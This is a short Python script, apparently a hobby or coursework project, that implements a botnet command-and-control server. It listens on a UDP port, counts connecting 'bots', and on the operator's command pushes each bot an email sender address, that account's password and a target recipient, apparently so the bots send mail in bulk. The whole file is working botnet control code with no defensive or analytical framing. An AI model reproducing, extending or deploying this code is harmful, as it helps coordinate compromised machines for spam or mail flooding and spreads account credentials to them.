''' 
Creator: Jeremy Thomas

Will message the client application with the recipient's email, the sender's email, and the sender's email password.
'''

from socket import *
import getpass
bot_count = 0
client_list = []
print("Welcome to the C&C server.")
info = [input("Enter sender's email: "), getpass.getpass(), input("Enter recipient's email: ")]
info_str = str(info[0]) + "#" + str(info[1]) + "#" + str(info[2])
server_port = 12000
server_socket = socket(AF_INET, SOCK_DGRAM)
server_socket.bind(('', server_port))
print("Server initialized. \n Ready to acknowledge bots. \n Enter '!send' to activate bots. \n There are 0 bots found.")

while True:
    message, client_address = server_socket.recvfrom(2048)
    print("Acknowledged " + str(client_address) + ".")
    bot_count += 1
    print("There are " + str(bot_count) + " bots found.")
    client_list.append(client_address)
    user_input = input("Do you want to activate bots? (y/n) ")
    if user_input == "y":
        for client in client_list:
            server_socket.sendto(info_str.encode(), client)
    else:
        pass
